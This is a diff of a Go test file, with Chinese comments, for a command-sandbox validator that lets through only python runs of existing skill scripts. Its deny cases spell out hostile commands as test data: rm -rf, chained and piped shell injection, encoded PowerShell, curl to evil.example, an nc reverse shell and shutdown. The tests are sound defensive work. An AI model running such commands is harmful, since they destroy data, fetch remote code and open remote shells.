@@ -10,19 +10,30 @@ import (
 
 // ─── 命令沙箱校验 ────────────────────────────────────────────
 
+// execute 命令策略（v2）：只允许 python 运行 skills/ 目录内已存在的技能脚本，
+// 不经过 shell，禁止 pip / -c / -m / 任意工作区脚本 / shell 元字符。
 func TestValidateSandboxedCommand(t *testing.T) {
+	// 用真实存在的技能脚本作为放行样例
+	pptScript := filepath.Join("skills", "export-ppt", "scripts", "export_ppt.py")
+	if _, err := os.Stat(pptScript); err != nil {
+		t.Skipf("技能脚本缺失，跳过：%v", err)
+	}
 	tmpFile := filepath.Join(os.TempDir(), "websql_sandbox_test_input.json")
+	_ = os.WriteFile(tmpFile, []byte("{}"), 0o644)
+	defer os.Remove(tmpFile)
+
 	okCases := []struct {
 		name string
 		cmd  string
 	}{
-		{"python 执行脚本", "python " + filepath.Join(getSandboxRoots().workspace, "gen.py") + " out.pptx"},
-		{"python3 执行脚本", "python3 " + filepath.Join(getSandboxRoots().workspace, "gen.py")},
-		{"pip 安装依赖", "pip install -r " + filepath.Join("skills", "export-ppt", "scripts", "requirements.txt")},
-		{"环境变量前缀", "PYTHONIOENCODING=utf-8 python gen.py"},
-		{"编码与环境准备", "chcp 65001 && set PYTHONIOENCODING=utf-8 && python gen.py"},
-		{"临时目录文件参数", "python gen.py " + tmpFile},
-		{"重定向", "python gen.py < " + tmpFile},
+		{"运行技能脚本", "python " + pptScript},
+		{"python3 运行技能脚本", "python3 " + pptScript},
+		{"位置参数传入 JSON", "python " + pptScript + " " + tmpFile},
+		{"标准输入重定向", "python " + pptScript + " < " + tmpFile},
+		{"编码前缀", "chcp 65001 >nul && set PYTHONIOENCODING=utf-8 && python " + pptScript},
+		{"环境变量前缀", "PYTHONIOENCODING=utf-8 python " + pptScript},
+		{"解释器 -u 参数", "python -u " + pptScript},
+		{"tail 日志后缀", "python " + pptScript + " 2>&1 | tail -20"},
 	}
 	for _, tc := range okCases {
 		t.Run("allow/"+tc.name, func(t *testing.T) {
@@ -36,18 +47,24 @@ func TestValidateSandboxedCommand(t *testing.T) {
 		name string
 		cmd  string
 	}{
+		{"pip 安装（禁止运行时安装）", "pip install requests"},
+		{"内联代码 -c", `python -c "import os; os.system('calc')"`},
+		{"模块执行 -m", "python -m http.server"},
+		{"工作区脚本（非技能目录）", "python " + filepath.Join(getSandboxRoots().workspace, "gen.py")},
+		{"沙箱外绝对路径脚本", sandboxEscapeCommand()},
+		{"命令拼接 &&", "python " + pptScript + " && rm -rf /"},
+		{"命令分隔 ;", "python " + pptScript + " ; whoami"},
+		{"管道到 shell", "python " + pptScript + " | sh"},
+		{"命令替换", "python $(echo evil).py"},
 		{"rm -rf", "rm -rf /"},
-		{"大小写变体 rm -Rf", "rm -Rf ./data"},
 		{"Windows 批量删除", "del /s /q C:\\data"},
 		{"powershell 编码执行", "powershell -enc ZQBjAGgAbwA="},
 		{"网络外传 curl", "curl http://evil.example/x.sh"},
-		{"网络外传 wget", "wget http://evil.example/x"},
 		{"反弹 shell", "nc -e /bin/sh 10.0.0.1 4444"},
 		{"系统关机", "shutdown /s /t 0"},
-		{"非白名单命令", "node evil.js"},
+		{"非 python 命令", "node evil.js"},
 		{"shell 直接执行", "cmd /c whoami"},
-		{"环境变量劫持 PATH", "set PATH=.\\evil && python x.py"},
-		{"沙箱外绝对路径", sandboxEscapeCommand()},
+		{"非 py 脚本", "python " + filepath.Join("skills", "evil.sh")},
 	}
 	for _, tc := range badCases {
 		t.Run("deny/"+tc.name, func(t *testing.T) {
